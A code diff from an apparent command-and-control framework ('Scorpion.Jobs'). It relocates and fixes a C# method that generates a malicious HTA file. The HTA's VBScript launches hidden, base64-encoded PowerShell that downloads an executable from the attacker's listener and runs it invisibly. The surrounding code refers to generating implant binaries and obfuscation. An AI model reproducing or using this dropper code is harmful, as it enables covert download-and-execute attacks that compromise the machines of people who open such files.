@@ -328,30 +328,7 @@ namespace Scorpion.Jobs
       throw new AppException("Unable to find or create listener for setup");
     }
 
-    public string GeneratePullAndExecBinaryHta(HttpListener listener, HostedFile hostedFile)
-    {
-      // TODO: make sure path starts with /
-      var script = string.Format(@"
-$loc = ""\Users\Public\Downloads\app-"" + (Get-Date).ToString(""yyyyMMddHHmmss"") + "".exe"";
-(New-Object Net.WebClient).DownloadFile('http://{0}{1}', $loc);
-Start-Process -FilePath $loc -WindowStyle Hidden;
-Write-Output ""Error"";
-", listener.ConnectAddresses[0], hostedFile.Path);
-      var covertedScript = Encoding.GetEncoding("UTF-16LE").GetBytes(script);
-      var encodedScript = Convert.ToBase64String(covertedScript);
-      var hta = string.Format(@"
-<script language=""VBScript"" >
-    Function DoStuff()
-        Dim wsh
-        Set wsh = CreateObject(""Wscript.Shell"")
-        wsh.run ""powershell - Sta - Nop - Window Hidden - EncodedCommand {0}""
-        set wsh = Nothing
-     End Function
-     DoStuff
-     self.close
-</script>", encodedScript);
-      return hta;
-    }
+
 
     public async Task<BinaryLauncher> GenerateBasicHttpGruntBinary(HttpListener listener)
     {
@@ -455,7 +432,30 @@ Write-Output ""Error"";
       Console.WriteLine("Listener created");
       return listener;
     }
-
+    public string GeneratePullAndExecBinaryHta(HttpListener listener, HostedFile hostedFile)
+    {
+      // TODO: make sure path starts with /
+      var script = string.Format(@"
+$loc = ""\Users\Public\Downloads\app-"" + (Get-Date).ToString(""yyyyMMddHHmmss"") + "".exe"";
+(New-Object Net.WebClient).DownloadFile('http://{0}{1}', $loc);
+Start-Process -FilePath $loc -WindowStyle Hidden;
+Write-Output ""Error"";
+", listener.ConnectAddresses[0], hostedFile.Path);
+      var covertedScript = Encoding.GetEncoding("UTF-16LE").GetBytes(script);
+      var encodedScript = Convert.ToBase64String(covertedScript);
+      var hta = string.Format(@"
+<script language=""VBScript"" >
+    Function DoStuff()
+        Dim wsh
+        Set wsh = CreateObject(""Wscript.Shell"")
+        wsh.run ""powershell -Sta -Nop -Window Hidden -EncodedCommand {0}""
+        set wsh = Nothing
+     End Function
+     DoStuff
+     self.close
+</script>", encodedScript);
+      return hta;
+    }
     public string GenerateObfuscarFile(string aGuid, string projDir)
     {
       var obfuscarXml = String.Format(@"<?xml version=""1.0"" encoding=""utf-8""?>
